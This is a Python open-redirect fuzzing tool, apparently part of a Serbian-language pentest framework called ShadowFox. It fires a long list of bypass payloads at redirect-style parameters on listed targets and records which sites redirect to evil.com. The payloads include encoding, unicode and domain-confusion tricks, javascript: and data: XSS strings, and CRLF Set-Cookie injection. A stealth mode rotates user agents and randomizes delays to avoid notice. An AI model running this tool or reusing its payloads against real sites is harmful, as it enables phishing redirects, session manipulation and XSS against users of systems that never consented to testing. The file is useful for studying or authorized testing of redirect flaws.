#!/usr/bin/env python3
"""
🦊 SHADOWFOX OPEN REDIRECT ATTACK MODULE
Specijalizovani modul za testiranje Open Redirect ranjivosti
Cilj: Redirekcija korisnika ka evil.com
Autor: Whitefox980 | Verzija: 2025.06.06
"""

import requests
import json
import time
import random
import urllib.parse
from urllib.parse import urljoin, urlparse, parse_qs
import re
import warnings
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

class ShadowRedirectFuzzer:
    def __init__(self):
        self.session = requests.Session()
        self.results = {
            "mission_info": {},
            "attack_summary": {
                "module": "Open Redirect Fuzzer",
                "target_vulnerability": "Open Redirect",
                "attack_vectors": 0,
                "successful_redirects": 0,
                "confirmed_vulnerabilities": []
            },
            "redirect_parameters": [],
            "payloads_tested": [],
            "successful_attacks": [],
            "failed_attempts": [],
            "statistics": {}
        }
        self.meta_config = {}
        self.recon_data = {}
        
        # Open Redirect parametri - najčešći u wild-u
        self.redirect_params = [
            'redirect', 'url', 'next', 'return', 'returnUrl', 'return_url',
            'goto', 'target', 'dest', 'destination', 'forward', 'continue',
            'redirect_to', 'redirect_url', 'redirectUrl', 'redir', 'link',
            'page', 'site', 'website', 'domain', 'host', 'callback',
            'success_url', 'failure_url', 'logout_url', 'login_redirect',
            'after_login', 'after_logout', 'success_redirect', 'error_redirect'
        ]
        
    def load_meta_config(self):
        """Učitava Meta konfiguraciju misije"""
        try:
            with open('Meta/mission_info.json', 'r') as f:
                self.meta_config = json.load(f)
                self.results["mission_info"] = self.meta_config
                print(f"🧠 [META] Misija: {self.meta_config.get('mission_id', 'UNKNOWN')}")
        except FileNotFoundError:
            print("❌ [ERROR] Meta/mission_info.json nije pronađen!")
            exit(1)
            
    def load_recon_data(self):
        """Učitava podatke iz ShadowRecon modula"""
        try:
            with open('ShadowRecon/shadow_recon.json', 'r') as f:
                self.recon_data = json.load(f)
                print(f"📊 [RECON] Učitano {len(self.recon_data.get('discovered_parameters', {}))} parametara")
        except FileNotFoundError:
            print("⚠️ [WARNING] ShadowRecon/shadow_recon.json nije pronađen")
            print("🔧 [INFO] Pokretam bez recon podataka...")
            
    def setup_session(self):
        """Konfiguracija sesije na osnovu Meta config"""
        headers = self.meta_config.get('default_headers', {})
        self.session.headers.update(headers)
        
        if self.meta_config.get('stealth_mode', False):
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
            ]
            self.session.headers['User-Agent'] = random.choice(user_agents)
            
        self.session.verify = False
        self.session.timeout = 10
        self.session.allow_redirects = False  # KRITIČNO za Open Redirect testiranje!
        
    def intelligent_delay(self):
        """Pametno kašnjenje na osnovu Meta config"""
        if self.meta_config.get('stealth_mode', False):
            delay = self.meta_config.get('rate_delay_seconds', 2.5)
            time.sleep(delay + random.uniform(0, 1))
            
    def generate_redirect_payloads(self):
        """Generisanje Open Redirect payload-a"""
        evil_domains = [
            "https://evil.com",
            "http://evil.com",
            "//evil.com",
            "https://evil.com/",
            "http://evil.com/",
            "//evil.com/",
            "evil.com",
            "evil.com/",
        ]
        
        # Bypass tehnike
        bypass_payloads = [
            # Double slash bypass
            "https://evil.com",
            "http://evil.com",
            "//evil.com",
            "///evil.com",
            
            # Protocol bypass
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            
            # Domain confusion
            "https://evil.com@legitimate.com",
            "https://legitimate.com.evil.com",
            "https://legitimate.com%2eevil.com",
            
            # Encoding bypass
            "https%3A%2F%2Fevil.com",
            "https%3a%2f%2fevil.com",
            "%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d",
            
            # Unicode bypass
            "https://evil.com",
            "https://evil。com",
            "https://evil.ⅽom",
            
            # IP bypass
            "http://192.168.1.1",
            "http://127.0.0.1",
            "http://0x7f000001",
            "http://2130706433",
            
            # Subdomain bypass
            "https://evil.com.attacker.com",
            "https://attacker.evil.com",
            
            # Path bypass
            "https://legitimate.com/../../../evil.com",
            "https://legitimate.com/..%2fevil.com",
            "https://legitimate.com/%2e%2e/evil.com",
            
            # Fragment bypass
            "https://evil.com#legitimate.com",
            "https://evil.com?legitimate.com",
            
            # Null byte bypass
            "https://evil.com%00.legitimate.com",
            "https://evil.com\x00.legitimate.com",
            
            # CRLF bypass
            "https://evil.com%0d%0aSet-Cookie:malicious",
            "https://evil.com%0aSet-Cookie:malicious",
            
            # Advanced bypasses
            "https://evil.com\\@legitimate.com",
            "https://evil.com%5c@legitimate.com",
            "https://evil.com%252f@legitimate.com"
        ]
        
        return bypass_payloads
        
    def find_redirect_parameters(self):
        """Pronalaženje parametara koji mogu biti redirect parametri"""
        found_params = []
        
        # Iz recon podataka
        if self.recon_data and 'discovered_parameters' in self.recon_data:
            for param_name, param_data in self.recon_data['discovered_parameters'].items():
                # Proveri da li ime parametra liči na redirect parametar
                if any(redir_param.lower() in param_name.lower() for redir_param in self.redirect_params):
                    found_params.append({
                        "name": param_name,
                        "source": "recon_discovered",
                        "data": param_data
                    })
                    
        # Dodaj standardne redirect parametre
        for param in self.redirect_params:
            if not any(p['name'] == param for p in found_params):
                found_params.append({
                    "name": param,
                    "source": "standard_wordlist",
                    "data": {}
                })
                
        self.results["redirect_parameters"] = found_params
        print(f"🎯 [PARAMS] Pronađeno {len(found_params)} potencijalnih redirect parametara")
        
        return found_params
        
    def test_redirect_parameter(self, base_url, param_name, payload):
        """Testiranje pojedinačnog redirect parametra sa payload-om"""
        try:
            # Kreiranje test URL-a
            separator = '&' if '?' in base_url else '?'
            test_url = f"{base_url}{separator}{param_name}={urllib.parse.quote(payload)}"
            
            self.intelligent_delay()
            response = self.session.get(test_url)
            
            # Analiza odgovora
            is_vulnerable = self.analyze_redirect_response(response, payload, test_url)
            
            test_result = {
                "url": test_url,
                "parameter": param_name,
                "payload": payload,
                "status_code": response.status_code,
                "headers": dict(response.headers),
                "vulnerable": is_vulnerable,
                "redirect_location": response.headers.get('Location', ''),
                "response_body_snippet": response.text[:500] if len(response.text) > 500 else response.text
            }
            
            self.results["payloads_tested"].append(test_result)
            
            if is_vulnerable:
                print(f"🚨 [VULN] {param_name} = {payload[:50]}...")
                self.results["successful_attacks"].append(test_result)
                self.results["attack_summary"]["successful_redirects"] += 1
                
                # Dodaj u confirmed vulnerabilities
                vuln_info = {
                    "type": "Open Redirect",
                    "severity": "MEDIUM",
                    "parameter": param_name,
                    "payload": payload,
                    "url": test_url,
                    "proof": {
                        "status_code": response.status_code,
                        "location_header": response.headers.get('Location', ''),
                        "response_contains_payload": payload in response.text
                    }
                }
                self.results["attack_summary"]["confirmed_vulnerabilities"].append(vuln_info)
            else:
                self.results["failed_attempts"].append(test_result)
                
            return is_vulnerable
            
        except Exception as e:
            print(f"❌ [ERROR] Test failed for {param_name}: {str(e)}")
            return False
            
    def analyze_redirect_response(self, response, payload, test_url):
        """Analiza HTTP odgovora za potvrdu Open Redirect ranjivosti"""
        # 1. Proveri Location header
        location = response.headers.get('Location', '')
        if location:
            # Direktna redirekcija na payload
            if payload in location:
                return True
                
            # Proveri da li je evil.com u Location header-u
            if 'evil.com' in location.lower():
                return True
                
        # 2. Proveri status kod redirekcije
        if response.status_code in [301, 302, 303, 307, 308]:
            if location and ('evil.com' in location.lower() or payload in location):
                return True
                
        # 3. Proveri JavaScript redirekciju
        js_redirect_patterns = [
            r'window\.location\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'location\.href\s*=\s*[\'"]([^\'"]+)[\'"]',
            r'location\.replace\s*\(\s*[\'"]([^\'"]+)[\'"]\s*\)',
            r'document\.location\s*=\s*[\'"]([^\'"]+)[\'"]'
        ]
        
        for pattern in js_redirect_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            for match in matches:
                if payload in match or 'evil.com' in match.lower():
                    return True
                    
        # 4. Proveri Meta refresh redirekciju
        meta_refresh_pattern = r'<meta[^>]+http-equiv=[\'"]refresh[\'"][^>]+content=[\'"][^;]*;\s*url=([^\'"]+)[\'"]'
        matches = re.findall(meta_refresh_pattern, response.text, re.IGNORECASE)
        for match in matches:
            if payload in match or 'evil.com' in match.lower():
                return True
                
        # 5. Proveri da li je payload reflektovan u response-u
        if payload in response.text and 'evil.com' in response.text:
            # Dodatna validacija - proveri kontekst
            payload_contexts = [
                r'href\s*=\s*[\'"]([^\'"]*' + re.escape(payload) + r'[^\'"]*)[\'"]',
                r'action\s*=\s*[\'"]([^\'"]*' + re.escape(payload) + r'[^\'"]*)[\'"]',
                r'src\s*=\s*[\'"]([^\'"]*' + re.escape(payload) + r'[^\'"]*)[\'"]'
            ]
            
            for context_pattern in payload_contexts:
                if re.search(context_pattern, response.text, re.IGNORECASE):
                    return True
                    
        return False
        
    def test_endpoints_from_recon(self):
        """Testiranje endpoint-a pronađenih u recon fazi"""
        if not self.recon_data or 'discovered_endpoints' not in self.recon_data:
            print("⚠️ [WARNING] Nema recon endpoint-a za testiranje")
            return
            
        endpoints = self.recon_data['discovered_endpoints']
        redirect_params = self.find_redirect_parameters()
        payloads = self.generate_redirect_payloads()
        
        print(f"🎯 [ATTACK] Testiram {len(endpoints)} endpoint-a sa {len(redirect_params)} parametara")
        
        for endpoint in endpoints[:10]:  # Ograniči na prvih 10 endpoint-a
            base_url = endpoint.get('url', '')
            if not base_url:
                continue
                
            print(f"🔍 [TEST] Endpoint: {base_url}")
            
            for param_info in redirect_params:
                param_name = param_info['name']
                
                for payload in payloads:
                    self.results["attack_summary"]["attack_vectors"] += 1
                    
                    # Test parametar sa payload-om
                    self.test_redirect_parameter(base_url, param_name, payload)
                    
                    # Prekini ako je pronađena ranjivost za ovaj parametar
                    if any(attack['parameter'] == param_name and attack['vulnerable'] 
                          for attack in self.results["successful_attacks"]):
                        print(f"✅ [SUCCESS] Parametar {param_name} je ranjiv - prelazim na sledeći")
                        break
                        
    def test_targets_from_file(self):
        """Testiranje URL-ova iz targets.txt fajla"""
        try:
            with open('targets.txt', 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
                
            redirect_params = self.find_redirect_parameters()
            payloads = self.generate_redirect_payloads()
            
            print(f"🎯 [TARGETS] Testiram {len(targets)} target-a")
            
            for target_url in targets:
                print(f"🔍 [TEST] Target: {target_url}")
                
                for param_info in redirect_params:
                    param_name = param_info['name']
                    
                    for payload in payloads[:5]:  # Ograniči na 5 najvažnijih payload-a
                        self.results["attack_summary"]["attack_vectors"] += 1
                        self.test_redirect_parameter(target_url, param_name, payload)
                        
        except FileNotFoundError:
            print("❌ [ERROR] targets.txt nije pronađen!")
            
    def generate_statistics(self):
        """Generisanje statistike napada"""
        total_tests = len(self.results["payloads_tested"])
        successful = len(self.results["successful_attacks"])
        
        stats = {
            "total_payloads_tested": total_tests,
            "successful_attacks": successful,
            "success_rate": (successful / total_tests * 100) if total_tests > 0 else 0,
            "unique_vulnerable_parameters": len(set(attack['parameter'] for attack in self.results["successful_attacks"])),
            "most_successful_payloads": self.get_most_successful_payloads(),
            "attack_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_confirmed_vulnerabilities": len(self.results["attack_summary"]["confirmed_vulnerabilities"])
        }
        
        self.results["statistics"] = stats
        
    def get_most_successful_payloads(self):
        """Pronalaženje najuspešnijih payload-a"""
        payload_success = {}
        
        for attack in self.results["successful_attacks"]:
            payload = attack['payload']
            if payload not in payload_success:
                payload_success[payload] = 0
            payload_success[payload] += 1
            
        # Sortiraj po broju uspešnih napada
        sorted_payloads = sorted(payload_success.items(), key=lambda x: x[1], reverse=True)
        return sorted_payloads[:5]
        
    def save_results(self):
        """Snimanje rezultata u attack_redirect_fuzz.json"""
        output_file = "Napad/attack_redirect_fuzz.json"
        
        try:
            with open(output_file, 'w') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            print(f"💾 [SAVE] Rezultati snimljeni: {output_file}")
        except Exception as e:
            print(f"❌ [SAVE ERROR] {str(e)}")
            
    def display_summary(self):
        """Prikaz sažetka napada"""
        stats = self.results["statistics"]
        print("\n🚨 SHADOWFOX OPEN REDIRECT ATTACK - SAŽETAK")
        print("=" * 60)
        print(f"🎯 Ukupno testova: {stats['total_payloads_tested']}")
        print(f"✅ Uspešni napadi: {stats['successful_attacks']}")
        print(f"📊 Stopa uspeha: {stats['success_rate']:.1f}%")
        print(f"🔍 Ranjivi parametri: {stats['unique_vulnerable_parameters']}")
        print(f"🚨 Potvrđene ranjivosti: {stats['total_confirmed_vulnerabilities']}")
        
        if self.results["successful_attacks"]:
            print(f"\n💥 PRONAĐENE RANJIVOSTI:")
            for vuln in self.results["attack_summary"]["confirmed_vulnerabilities"]:
                print(f"   🚨 {vuln['parameter']} @ {vuln['url'][:80]}...")
                print(f"      Payload: {vuln['payload'][:50]}...")
                
        if stats.get("most_successful_payloads"):
            print(f"\n🏆 NAJUSPEŠNIJI PAYLOAD-I:")
            for payload, count in stats["most_successful_payloads"]:
                print(f"   • {payload[:50]}... ({count} uspešnih)")
                
        print(f"\n✅ Rezultati: Napad/attack_redirect_fuzz.json")
        
    def run_attack(self):
        """Glavna attack operacija"""
        print("🦊 SHADOWFOX OPEN REDIRECT ATTACK - POKRETANJE")
        print("=" * 60)
        
        # 1. Učitaj Meta config
        self.load_meta_config()
        
        # 2. Učitaj recon podatke
        self.load_recon_data()
        
        # 3. Podesi sesiju
        self.setup_session()
        
        # 4. Pronađi redirect parametre
        print("🔍 [PARAM] Tražim redirect parametre...")
        self.find_redirect_parameters()
        
        # 5. Test endpoint-a iz recon-a
        if self.recon_data:
            print("🎯 [ATTACK] Testiram endpoint-e iz recon faze...")
            self.test_endpoints_from_recon()
        
        # 6. Test target-a iz fajla
        print("🎯 [ATTACK] Testiram target-e iz targets.txt...")
        self.test_targets_from_file()
        
        # 7. Generisanje statistike
        print("📊 [STATS] Generisanje statistike...")
        self.generate_statistics()
        
        # 8. Snimanje rezultata
        self.save_results()
        
        # 9. Prikaz sažetka
        self.display_summary()

def main():
    fuzzer = ShadowRedirectFuzzer()
    fuzzer.run_attack()

if __name__ == "__main__":
    main()
